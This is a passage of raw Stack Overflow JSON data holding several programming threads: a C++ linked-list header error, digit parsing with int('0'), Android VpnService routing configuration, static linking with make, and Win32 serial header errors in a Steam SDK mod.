"https://www.gravatar.com/avatar/d8214cf99b0fa33b4f7d571801914b53?s=128&d=identicon&r=PG", "display_name": "vsoftco", "link": "https://stackoverflow.com/users/3093378/vsoftco"}, "reply_to_user": {"reputation": 818, "user_id": 537089, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/deb07d538afab86e85877e7f787c2fe8?s=128&d=identicon&r=PG", "display_name": "markbratanov", "link": "https://stackoverflow.com/users/537089/markbratanov"}, "edited": false, "score": 0, "creation_date": 1429749148, "post_id": 29810921, "comment_id": 47750772, "body": "@markbratanov you need to create another <code>cpp</code> file in which to implement the class, call it <code>NumberList.cpp</code>. You must `#include &quot;NumberList.h&quot; inside, and define your class member functions. Or, just define all functions inside the class, as I mentioned in the 2nd code snippet. You are getting linker errors because you just declared the destructor, but didn&#39;t implement it (defined). You must implement all functions (at least the one you are using)."}], "tags": [], "owner": {"reputation": 52050, "user_id": 3093378, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d8214cf99b0fa33b4f7d571801914b53?s=128&d=identicon&r=PG", "display_name": "vsoftco", "link": "https://stackoverflow.com/users/3093378/vsoftco"}, "is_accepted": false, "score": 1, "last_activity_date": 1429747090, "last_edit_date": 1429747090, "creation_date": 1429746078, "answer_id": 29810921, "question_id": 29810913, "link": "https://stackoverflow.com/questions/29810913/error-c2535-void-numberlistappendnodedouble-member-function-already-def/29810921#29810921", "title": "Error C2535: &#39;void NumberList::appendNode(double)&#39; : member function already defined or declared\tLine 35", "body": "<p>You first declared the function in the class declaration, then also defined it inside the class declaration. You either have to move the definition outside, in a corresponding <code>.cpp</code> file that implements the class, i.e. the code below should be in the implementation <code>cpp</code> file:</p>\n\n<pre><code>void NumberList::appendNode(double num)\n{\n    // implementation\n}\n</code></pre>\n\n<p>or define it inline in the class</p>\n\n<pre><code>class NumberList\n{ \n    // .... \n    void appendNode(double num) // automatically inline\n    {\n        // implement\n    }\n};\n</code></pre>\n\n<p>A third option is to define it in the header file but outside the class, however in this case you have to explicitly mark it as <code>inline</code>, since otherwise including your header in multiple <code>cpp</code> files will lead to a linker error due to a duplicate symbol</p>\n\n<pre><code>inline void NumberList::appendNode(double num) // this can now be in the header file\n{\n    // implementation\n}\n</code></pre>\n\n<p>You cannot have both a declaration <strong>and</strong> a definition inside a class.</p>\n"}, {"comments": [{"owner": {"reputation": 52050, "user_id": 3093378, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/d8214cf99b0fa33b4f7d571801914b53?s=128&d=identicon&r=PG", "display_name": "vsoftco", "link": "https://stackoverflow.com/users/3093378/vsoftco"}, "edited": false, "score": 1, "creation_date": 1429746911, "post_id": 29810944, "comment_id": 47750019, "body": "If you define the member function inside the header but outside the class, you should mark it <code>inline</code>, otherwise, including the header in different compilation units will lead to multiple definitions (hence a linker error due to a duplicate symbol). Best is to put it in a <code>.cpp</code>, or define it inside the class (which will then automatically be inlined)."}], "tags": [], "owner": {"reputation": 11342, "user_id": 1144157, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/d05077a347e63679d43bfbdaf5e7b9ab?s=128&d=identicon&r=PG", "display_name": "Steephen", "link": "https://stackoverflow.com/users/1144157/steephen"}, "is_accepted": false, "score": 1, "last_activity_date": 1429746184, "creation_date": 1429746184, "answer_id": 29810944, "question_id": 29810913, "link": "https://stackoverflow.com/questions/29810913/error-c2535-void-numberlistappendnodedouble-member-function-already-def/29810944#29810944", "title": "Error C2535: &#39;void NumberList::appendNode(double)&#39; : member function already defined or declared\tLine 35", "body": "<p>You have to close class declaration end brace before starting function definition.\n//specification file for the numberlist class</p>\n\n<pre><code>#ifndef NUMBERLIST_H\n#define NUMBERLIST_H\n\nclass NumberList\n{\nprivate:\n    //declares a structure for the list\n    struct ListNode\n    {\n        double value; // value in the node\n        struct ListNode *next; //to point to the next node \n\n    };\n\n    ListNode *head; // list head pointer\n\npublic: \n    // construcorr\n    NumberList()\n    {\n        head = nullptr;\n    }\n\n    ~NumberList();\n    //linked list operations\n    void appendNode(double);\n    void insertNode(double);\n    void deleteNode(double);\n    void dispayList()const;\n};\n\n\n    void NumberList::appendNode(double num)\n    {\n        ListNode *newNode;\n        ListNode *nodePtr;\n\n        //allocate a new node and store num there\n        newNode = new ListNode;\n        newNode-&gt;value = num;\n        newNode-&gt;next = nullptr;\n        //if there are no nodes in the listmake newNode first node\n        if (!head)\n            head = newNode;\n        else // otherwise insert newNode at end\n        {\n            //initialize nodePtr to head of list\n            nodePtr = head;\n            //find the last node in the list\n            while (nodePtr-&gt;next)\n                nodePtr = nodePtr-&gt;next;\n            // insert newNode as the last node\n            nodePtr-&gt;next = newNode;\n\n        }\n    }\n\n\n#endif\n</code></pre>\n"}], "owner": {"reputation": 818, "user_id": 537089, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/deb07d538afab86e85877e7f787c2fe8?s=128&d=identicon&r=PG", "display_name": "markbratanov", "link": "https://stackoverflow.com/users/537089/markbratanov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 472, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1429747090, "creation_date": 1429746010, "question_id": 29810913, "link": "https://stackoverflow.com/questions/29810913/error-c2535-void-numberlistappendnodedouble-member-function-already-def", "title": "Error C2535: &#39;void NumberList::appendNode(double)&#39; : member function already defined or declared\tLine 35", "body": "<p>In the middle of our class and currently we are stuck on the following compiling error. Not sure if it's the compiler or our code. Any help or guidance would be appreciated.</p>\n\n<p><strong>Our header file:</strong></p>\n\n<pre><code>//specification file for the numberlist class\n\n#ifndef NUMBERLIST_H\n#define NUMBERLIST_H\n\nclass NumberList\n{\nprivate:\n    //declares a structure for the list\n    struct ListNode\n    {\n        double value; // value in the node\n        struct ListNode *next; //to point to the next node \n\n    };\n\n    ListNode *head; // list head pointer\n\npublic: \n    // construcorr\n    NumberList()\n    {\n        head = nullptr;\n    }\n\n    ~NumberList();\n    //linked list operations\n    void appendNode(double);\n    void insertNode(double);\n    void deleteNode(double);\n    void dispayList()const;\n\n\n    void NumberList::appendNode(double num)\n    {\n        ListNode *newNode;\n        ListNode *nodePtr;\n\n        //allocate a new node and store num there\n        newNode = new ListNode;\n        newNode-&gt;value = num;\n        newNode-&gt;next = nullptr;\n        //if there are no nodes in the listmake newNode first node\n        if (!head)\n            head = newNode;\n        else // otherwise insert newNode at end\n        {\n            //initialize nodePtr to head of list\n            nodePtr = head;\n            //find the last node in the list\n            while (nodePtr-&gt;next)\n                nodePtr = nodePtr-&gt;next;\n            // insert newNode as the last node\n            nodePtr-&gt;next = newNode;\n\n        }\n    }\n\n};\n\n#endif\n</code></pre>\n\n<p><strong>Our CPP file:</strong></p>\n\n<pre><code>//this program demonstrates a simple append operation on a linked list\n#include &lt;iostream&gt;\n#include \"NumberList.h\"\nusing namespace std;\n\nint main()\n{\n    //define a numberList object\n    NumberList list;\n    //append some values\n    list.appendNode(2.5);\n    list.appendNode(7.9);\n    list.appendNode(12.6);\n\n\n\n    system(\"pause\");\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c++", "function", "int"], "comments": [{"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1429745867, "post_id": 29810851, "comment_id": 47749686, "body": "same as <code>(int)&#39;0&#39;</code> but with C++ syntax"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1429748196, "post_id": 29810851, "comment_id": 47750458, "body": "to clarify, <code>int(X)</code> is redundant in this code.  The key point is <code>inputstring[i] - &#39;0&#39;</code>, which is covered by the duplicate; and there are redundant casts.  Whoever wrote this code didn&#39;t know the language very well."}], "answers": [{"comments": [{"owner": {"reputation": 783, "user_id": 3289638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4Gt4U.jpg?s=128&g=1", "display_name": "Amr Ragaey", "link": "https://stackoverflow.com/users/3289638/amr-ragaey"}, "edited": false, "score": 0, "creation_date": 1429746162, "post_id": 29810874, "comment_id": 47749781, "body": "Why you used int(&#39;0&#39;) it has nonsense here since int(&#39;9&#39;) is 9"}, {"owner": {"reputation": 15136, "user_id": 4044696, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/54xyv.jpg?s=128&g=1", "display_name": "Severin Pappadeux", "link": "https://stackoverflow.com/users/4044696/severin-pappadeux"}, "reply_to_user": {"reputation": 783, "user_id": 3289638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4Gt4U.jpg?s=128&g=1", "display_name": "Amr Ragaey", "link": "https://stackoverflow.com/users/3289638/amr-ragaey"}, "edited": false, "score": 0, "creation_date": 1429746282, "post_id": 29810874, "comment_id": 47749817, "body": "@user3289638 In my world <code>int(&#39;9&#39;)</code> is equal to 57"}, {"owner": {"reputation": 15136, "user_id": 4044696, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/54xyv.jpg?s=128&g=1", "display_name": "Severin Pappadeux", "link": "https://stackoverflow.com/users/4044696/severin-pappadeux"}, "reply_to_user": {"reputation": 783, "user_id": 3289638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4Gt4U.jpg?s=128&g=1", "display_name": "Amr Ragaey", "link": "https://stackoverflow.com/users/3289638/amr-ragaey"}, "edited": false, "score": 0, "creation_date": 1429746314, "post_id": 29810874, "comment_id": 47749829, "body": "@user3289638 see <code>http:&#47;&#47;www.asciitable.com&#47;</code>"}, {"owner": {"reputation": 783, "user_id": 3289638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4Gt4U.jpg?s=128&g=1", "display_name": "Amr Ragaey", "link": "https://stackoverflow.com/users/3289638/amr-ragaey"}, "edited": false, "score": 0, "creation_date": 1429746457, "post_id": 29810874, "comment_id": 47749873, "body": "Oh, it&#39;s clear now to me thanks a lot Severin"}], "tags": [], "owner": {"reputation": 15136, "user_id": 4044696, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/54xyv.jpg?s=128&g=1", "display_name": "Severin Pappadeux", "link": "https://stackoverflow.com/users/4044696/severin-pappadeux"}, "is_accepted": false, "score": 1, "last_activity_date": 1429745779, "creation_date": 1429745779, "answer_id": 29810874, "question_id": 29810851, "link": "https://stackoverflow.com/questions/29810851/c-what-is-the-usage-of-int0-in-this-code/29810874#29810874", "title": "C++ : What is the usage of int(&#39;0&#39;) in this code?", "body": "<p>It converts char into ASCII code to make number out of string</p>\n\n<pre><code>int('9') - int('0') = 9\n</code></pre>\n"}], "owner": {"reputation": 783, "user_id": 3289638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4Gt4U.jpg?s=128&g=1", "display_name": "Amr Ragaey", "link": "https://stackoverflow.com/users/3289638/amr-ragaey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 729, "favorite_count": 0, "closed_date": 1429745836, "answer_count": 1, "score": 0, "last_activity_date": 1429745822, "creation_date": 1429745664, "question_id": 29810851, "link": "https://stackoverflow.com/questions/29810851/c-what-is-the-usage-of-int0-in-this-code", "closed_reason": "Duplicate", "title": "C++ : What is the usage of int(&#39;0&#39;) in this code?", "body": "<p>This code Find the sum of all digits that occur in a string.</p>\n\n<p><strong>Example</strong></p>\n\n<blockquote>\n  <p>sumUpNumbers(\"2 apples, 12 oranges\") = 5  //2+1+2</p>\n</blockquote>\n\n<p>Can anyone explain the need for use int('0') in this code!?</p>\n\n<pre><code>int sumUpDigits(std::string inputString) {\n\n  int answer = 0;\n\n  for (int i = 0; i &lt; inputString.size(); i++) {  \n    if ('1' &lt;= inputString[i] &amp;&amp; inputString[i] &lt;= '9') {\n      answer += int(inputString[i]) - int('0');\n    }\n  }\n\n  return answer;\n}\n</code></pre>\n"}, {"tags": ["java", "android", "c++", "vpn"], "comments": [{"owner": {"reputation": 1, "user_id": 4886789, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-D1DH21jx0Qg/AAAAAAAAAAI/AAAAAAAABh0/jS-avdaxqRs/photo.jpg?sz=128", "display_name": "M Bilal", "link": "https://stackoverflow.com/users/4886789/m-bilal"}, "edited": false, "score": 0, "creation_date": 1436249813, "post_id": 29810727, "comment_id": 50517765, "body": "This will help     [1]: <a href=\"http://stackoverflow.com/questions/20269283/writing-to-vpnservice-output-stream-provides-no-response[1]\" title=\"writing to vpnservice output stream provides no response%5b1%5d\">stackoverflow.com/questions/20269283/&hellip;</a>"}, {"owner": {"reputation": 6039, "user_id": 1237141, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/1f27666c428da16a4c03f7460d21a86b?s=128&d=identicon&r=PG", "display_name": "thedarkpassenger", "link": "https://stackoverflow.com/users/1237141/thedarkpassenger"}, "edited": false, "score": 0, "creation_date": 1455970327, "post_id": 29810727, "comment_id": 58735807, "body": "Facing a similar problem ? Were you able to solve the problem ?"}], "answers": [{"tags": [], "owner": {"reputation": 1062, "user_id": 2588878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XufnG.png?s=128&g=1", "display_name": "AllThatICode", "link": "https://stackoverflow.com/users/2588878/allthaticode"}, "is_accepted": false, "score": 0, "last_activity_date": 1540273910, "creation_date": 1540273910, "answer_id": 52941961, "question_id": 29810727, "link": "https://stackoverflow.com/questions/29810727/android-vpnservice-configuration/52941961#52941961", "title": "Android VpnService Configuration", "body": "<p>First, let me start by explaining <a href=\"https://developer.android.com/reference/android/net/VpnService.Builder.html#VpnService.Builder()\" rel=\"nofollow noreferrer\">Builder</a> configuration above.</p>\n\n<pre><code>builder.setSession(\"MyVPNService\") // This one is optional. \n\n.addAddress(\"192.168.56.0\", 32) // This is used to assign interface address. First param is IP address, and second in prefix length. \"Prefix\" length is also commonly known as subnet mask.\n\n.addDnsServer(\"8.8.8.4\") // This configures the DNS network for VPN network. For ex - All DNS resolutions would go to 8.8.8.4:53. Note that the DNS request packets gets routed through the tun interface.\n\n.addRoute(\"0.0.0.0\", 1); // This controls the IP addresses which gets routed through tun interface.\n</code></pre>\n\n<p>Note - that tun interface can support multiple address families (IPv4/IPv6). As an example, you can assign multiple interface addresses (say a v4, a v6, or two v6 addresses, or whatever combo).</p>\n\n<p>Similarly, you can add routes that you want your VPN to handle. Now, the main question is <strong>how do you decide which routes should my VPN handle?</strong></p>\n\n<p>Well there are bunch of options.</p>\n\n<ol>\n<li>Route everything - Adding 0.0.0.0/0 (for IPv4), and ::/0 (for IPv6) would route traffic for all destinations through VPN (Note: 0.0.0.0/0 represents entire IPv4 range i.e. 0.0.0.0 to 255.255.255.255).</li>\n<li>Route specific routes - You would have typically noticed that talking to IoT devices does not work when VPN is running. That is typically due to \"route everything\" config setup which breaks local networking (ex - chromecast). So, excluding link local traffic requires doing some math that involves subtracting link local subnets from above subnets (0.0.0.0/0, ::/0 (for v6 local subnets)). The math involved is not very straightforward which makes this option a lot more complex. As for what constitutes link local subnets, here is a list from <a href=\"https://en.wikipedia.org/wiki/Reserved_IP_addresses\" rel=\"nofollow noreferrer\">wikipedia</a>, and from IETF for <a href=\"https://www.iana.org/assignments/iana-ipv4-special-registry/iana-ipv4-special-registry.xhtml\" rel=\"nofollow noreferrer\">IPv4</a> and <a href=\"https://www.iana.org/assignments/iana-ipv6-special-registry/iana-ipv6-special-registry.xhtml\" rel=\"nofollow noreferrer\">IPv6</a> special addresses.</li>\n</ol>\n\n<p>That said, here are some answers to your questions.</p>\n\n<blockquote>\n  <p>I need ALL packets outbound from the Android phone to be routed to the tun device</p>\n</blockquote>\n\n<p>See \"route everything\" above.</p>\n\n<blockquote>\n  <p>Isn't a tun device supposed to have ONE IP?</p>\n</blockquote>\n\n<p>An interface on linux can have multiple interface addresses assigned to it from different address families.</p>\n\n<blockquote>\n  <p>Then what is \"192.168.56.0\", 32\". </p>\n</blockquote>\n\n<p>As explained above, first part is the IP address, and second defines the subnet mask. Also see <a href=\"https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing#CIDR_notation\" rel=\"nofollow noreferrer\">CIDR notation</a>.</p>\n\n<blockquote>\n  <p>Also when I try to add a route \"0.0.0.0\", 0 the whole android phone hangs and restarts.</p>\n</blockquote>\n\n<p>0.0.0.0/0 means entire IPv4 address space will get routed through the VPN. Typically, a VPN cannot handle link local traffic as I have mentioned above. So, you will have to exclude certain local subnets (see links above). As for phone hanging and restarting, I'm not sure if that has anything to do with the VPN unless VPN is not handling traffic correctly (which would lead networking related apps to break).</p>\n"}], "owner": {"reputation": 376, "user_id": 4518353, "user_type": "registered", "accept_rate": 75, "profile_image": "https://lh4.googleusercontent.com/-M91XiIDCrOs/AAAAAAAAAAI/AAAAAAAAAUA/PPxc0V1dFC8/photo.jpg?sz=128", "display_name": "Abhishek Vasisht", "link": "https://stackoverflow.com/users/4518353/abhishek-vasisht"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 2048, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1540273910, "creation_date": 1429745025, "question_id": 29810727, "link": "https://stackoverflow.com/questions/29810727/android-vpnservice-configuration", "title": "Android VpnService Configuration", "body": "<p>I am trying to use the VpnService from android to setup a simple tun device on the client side and on the receiving side I have a c++ server running. </p>\n\n<p>I am having a lot of problems with the VpnService. This is what I need, \nI need ALL packets outbound from the Android phone to be routed to the tun device, and in the program I route it through a Datagram channel to the server. When I send a string, it works fine, but when I send other data through this Datagram channel, i don't see any UDP packets in Wireshark :\\</p>\n\n<p>Also, I am new to Java and Datagram channels. Here Is my code</p>\n\n<pre><code>//To establish the tunnel\nbuilder.setSession(\"MyVPNService\")\n            .addAddress(\"192.168.56.0\", 32)\n            .addDnsServer(\"8.8.8.4\")\n            .addRoute(\"0.0.0.0\", 1);\n\nmInterface=builder.establish();\n</code></pre>\n\n<p>What exactly are the above configurations doing? Isn't a tun device supposed to have ONE IP(from my experience from doing it on linux), then what is \"\"192.168.56.0\", 32\". Also when i try to add a route \"0.0.0.0\", 0 the whole android phone hangs and restarts :\\</p>\n\n<pre><code>while (true) {\n                int length;\n                // Read the outgoing packet from the input stream.\n\n                length=in.read(packet_bytes);\n                //int length = in.read(packet.array());\n                if (length &gt; 0) {\n                    // Write the outgoing packet to the tunnel.\n                    //packet.limit(length);\n                    //tunnel.send(packe,server);\n                    tunnel.send(packet,server);\n                    packet.put(packet_bytes,0,length);\n\n                    tunnel.write(packet);\n\n                    packet.clear();\n                }\n                Thread.sleep(200);\n                // Read the incoming packet from the tunnel.\n\n                length = tunnel.read(packet);\n                if (length &gt; 0) {\n\n                    out.write(packet.array(), 0, length);\n\n                    packet.clear();\n\n                    // If we were sending, switch to receiving.\n                }\n                Thread.sleep(200);\n            }\n</code></pre>\n\n<p>This is the part where I take it from interface and put it on the other. </p>\n"}, {"tags": ["c++", "static", "makefile"], "comments": [{"owner": {"reputation": 200780, "user_id": 116908, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/54d38793d7a407446999b33b81d607fd?s=128&d=identicon&r=PG", "display_name": "Carl Norum", "link": "https://stackoverflow.com/users/116908/carl-norum"}, "edited": false, "score": 0, "creation_date": 1429744813, "post_id": 29810674, "comment_id": 47749288, "body": "You also need to link with <code>-static</code>. Can you show more of your build process?"}, {"owner": {"reputation": 195, "user_id": 4393879, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/fUz3b.jpg?s=128&g=1", "display_name": "Cheshire Cat", "link": "https://stackoverflow.com/users/4393879/cheshire-cat"}, "reply_to_user": {"reputation": 200780, "user_id": 116908, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/54d38793d7a407446999b33b81d607fd?s=128&d=identicon&r=PG", "display_name": "Carl Norum", "link": "https://stackoverflow.com/users/116908/carl-norum"}, "edited": false, "score": 0, "creation_date": 1429745271, "post_id": 29810674, "comment_id": 47749460, "body": "Okay, good point. Should I paste whole build output? It is long. Just download xdotools source and add -static to CFLAGS+= -gcc=99 (or something)."}, {"owner": {"reputation": 200780, "user_id": 116908, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/54d38793d7a407446999b33b81d607fd?s=128&d=identicon&r=PG", "display_name": "Carl Norum", "link": "https://stackoverflow.com/users/116908/carl-norum"}, "edited": false, "score": 0, "creation_date": 1429745543, "post_id": 29810674, "comment_id": 47749555, "body": "Check the linker flags too."}, {"owner": {"reputation": 200780, "user_id": 116908, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/54d38793d7a407446999b33b81d607fd?s=128&d=identicon&r=PG", "display_name": "Carl Norum", "link": "https://stackoverflow.com/users/116908/carl-norum"}, "edited": false, "score": 0, "creation_date": 1429745857, "post_id": 29810674, "comment_id": 47749682, "body": "And watch out for any sub-libraries that get built as part of the whole program."}, {"owner": {"reputation": 195, "user_id": 4393879, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/fUz3b.jpg?s=128&g=1", "display_name": "Cheshire Cat", "link": "https://stackoverflow.com/users/4393879/cheshire-cat"}, "reply_to_user": {"reputation": 200780, "user_id": 116908, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/54d38793d7a407446999b33b81d607fd?s=128&d=identicon&r=PG", "display_name": "Carl Norum", "link": "https://stackoverflow.com/users/116908/carl-norum"}, "edited": false, "score": 0, "creation_date": 1429746130, "post_id": 29810674, "comment_id": 47749767, "body": "You need to be way more specific here :P"}, {"owner": {"reputation": 200780, "user_id": 116908, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/54d38793d7a407446999b33b81d607fd?s=128&d=identicon&r=PG", "display_name": "Carl Norum", "link": "https://stackoverflow.com/users/116908/carl-norum"}, "edited": false, "score": 0, "creation_date": 1429746200, "post_id": 29810674, "comment_id": 47749797, "body": "I&#39;ll try to take a look the next time I&#39;m at a computer."}, {"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1429746525, "post_id": 29810674, "comment_id": 47749895, "body": "What says it cannot open the folder? That doesn&#39;t sound like a linker related error. That sounds like a path problem with the scp command. You need to be <b>much</b> more clear about what you are trying to do, what you have done, what problems you are having and where you are having them."}], "owner": {"reputation": 195, "user_id": 4393879, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/fUz3b.jpg?s=128&g=1", "display_name": "Cheshire Cat", "link": "https://stackoverflow.com/users/4393879/cheshire-cat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 49, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1429744704, "creation_date": 1429744704, "question_id": 29810674, "link": "https://stackoverflow.com/questions/29810674/make-static-program", "title": "Make static program", "body": "<p>when I compile some program to work on server, I just add to g++ line -static flag, then I can run it without any library on external PC. Is there a way to compile this way more complex source? I know I can add -static to CFLAGS in Makefile, but it is not enough - after trying to send <strong>xdotools</strong> to server via scp, ssh protocol says it cannot open this folder (wtf?).</p>\n"}, {"tags": ["c++", "sdk", "steam"], "comments": [{"owner": {"reputation": 5409, "user_id": 480386, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/hKe7X.jpg?s=128&g=1", "display_name": "Christian Abella", "link": "https://stackoverflow.com/users/480386/christian-abella"}, "edited": false, "score": 0, "creation_date": 1429744449, "post_id": 29810505, "comment_id": 47749168, "body": "what is the error? and can you post your source code? are you using Visual Studio?"}, {"owner": {"reputation": 6085, "user_id": 425871, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/58MZp.jpg?s=128&g=1", "display_name": "Steve", "link": "https://stackoverflow.com/users/425871/steve"}, "edited": false, "score": 0, "creation_date": 1429747725, "post_id": 29810505, "comment_id": 47750299, "body": "It&#39;s not clear if you&#39;re having compiler issues or linker issues. Post the <i>exact</i> error you&#39;re getting. Syntax errors in Serial.h mean it&#39;s being found. Syntax errors aren&#39;t linker errors. What compiler are you using? Etc., etc., you need more information."}, {"owner": {"reputation": 109, "user_id": 4692610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/574014c61adef68e1c09b64b58fca51d?s=128&d=identicon&r=PG&f=1", "display_name": "Eric", "link": "https://stackoverflow.com/users/4692610/eric"}, "reply_to_user": {"reputation": 6085, "user_id": 425871, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/58MZp.jpg?s=128&g=1", "display_name": "Steve", "link": "https://stackoverflow.com/users/425871/steve"}, "edited": false, "score": 0, "creation_date": 1429760598, "post_id": 29810505, "comment_id": 47754191, "body": "@Steve  After trying over and over, I couldn&#39;t get everything formatted in the comment box, so check my edit for more information.  Thanks for responding."}], "owner": {"reputation": 109, "user_id": 4692610, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/574014c61adef68e1c09b64b58fca51d?s=128&d=identicon&r=PG&f=1", "display_name": "Eric", "link": "https://stackoverflow.com/users/4692610/eric"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 157, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1429760416, "creation_date": 1429743802, "last_edit_date": 1429760416, "question_id": 29810505, "link": "https://stackoverflow.com/questions/29810505/trying-to-link-a-seperate-serial-c-header-to-the-steam-sdk", "title": "Trying to link a seperate Serial C++ header to the Steam SDK", "body": "<p>I'm trying to get serial communication to work through a Steam mod.  To take care of the serial communication in the Steam SDK's native C++ code, <a href=\"http://www.codeproject.com/Articles/992/Serial-library-for-C\" rel=\"nofollow\">I found a C++ Serial library based on Win32 here.</a></p>\n\n<p>I've been playing around with it and it seems fine, but when I try to</p>\n\n<pre><code> #include \"Serial.h\"\n</code></pre>\n\n<p>in a Steam SDK source code object, it seems like it doesn't recognize it.  I pointed the linker to the file, but I get dozens of \"undeclared identifiers\" and syntax errors in Serial.h when I go to compile.  Is this header file in a format that the Steam SDK can't read?  Is there an alternative to get serial communication in a Steam mod?</p>\n\n<p>EDIT:  Sorry all, some details.  I'm using Visual Studio 2013.  When I go to compile, I get an error like</p>\n\n<pre><code>...\\serial.h(91): error C2065: 'EV_BREAK' : undeclared identifier\n</code></pre>\n\n<p>for a definition like:</p>\n\n<pre><code>class CSerial\n  {\n  public:\n    typedef enum\n    {\n        EEventBreak        = EV_BREAK,\n</code></pre>\n\n<p>It seems it catches almost every definition like this.  Then there's the smattering of syntax errors:</p>\n\n<pre><code>5&gt;c:\\users\\eric\\desktop\\modding\\test mod\\source-sdk-2013-master\\sp\\src\\game\\server\\serial.h(306): warning C4183: 'Write': missing return type; assumed to be a member function returning 'int'\n5&gt;c:\\users\\eric\\desktop\\modding\\test mod\\source-sdk-2013-master\\sp\\src\\game\\server\\serial.h(311): error C2146: syntax error : missing ';' before identifier 'Read'\n5&gt;c:\\users\\eric\\desktop\\modding\\test mod\\source-sdk-2013-master\\sp\\src\\game\\server\\serial.h(311): error C2433: 'CSerial::LONG' : 'virtual' not permitted on data declarations\n5&gt;c:\\users\\eric\\desktop\\modding\\test mod\\source-sdk-2013-master\\sp\\src\\game\\server\\serial.h(311): error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n5&gt;c:\\users\\eric\\desktop\\modding\\test mod\\source-sdk-2013-master\\sp\\src\\game\\server\\serial.h(311): error C2061: syntax error : identifier 'DWORD'\n5&gt;c:\\users\\eric\\desktop\\modding\\test mod\\source-sdk-2013-master\\sp\\src\\game\\server\\serial.h(311): warning C4183: 'Read': missing return type; assumed to be a member function returning 'int'\n5&gt;c:\\users\\eric\\desktop\\modding\\test mod\\source-sdk-2013-master\\sp\\src\\game\\server\\serial.h(314): error C2146: syntax error : missing ';' before identifier 'Break'\n5&gt;c:\\users\\eric\\desktop\\modding\\test mod\\source-sdk-2013-master\\sp\\src\\game\\server\\serial.h(314): error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n5&gt;c:\\users\\eric\\desktop\\modding\\test mod\\source-sdk-2013-master\\sp\\src\\game\\server\\serial.h(314): warning C4183: 'Break': missing return type; assumed to be a member function returning 'int'\n5&gt;c:\\users\\eric\\desktop\\modding\\test mod\\source-sdk-2013-master\\sp\\src\\game\\server\\serial.h(329): error C2146: syntax error : missing ';' before identifier 'GetLastError'\n5&gt;c:\\users\\eric\\desktop\\modding\\test mod\\source-sdk-2013-master\\sp\\src\\game\\server\\serial.h(329): error C4430: missing type specifier - int assumed. Note: C++ does not support default-int\n</code></pre>\n\n<p>I don't want to fill up the page, but there's on the order of about a hundred errors like this.  Overall there's just tons of syntax errors, which doesn't make sense, as I can make this header compile fine in another project.</p>\n"}, {"tags": ["c++", "segmentation-fault", "strtok"], "comments": [{"owner": {"reputation": 20231, "user_id": 1342730, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/36543a7316596ec6e930bc8c996bf14b?s=128&d=identicon&r=PG", "display_name": "mathematician1975", 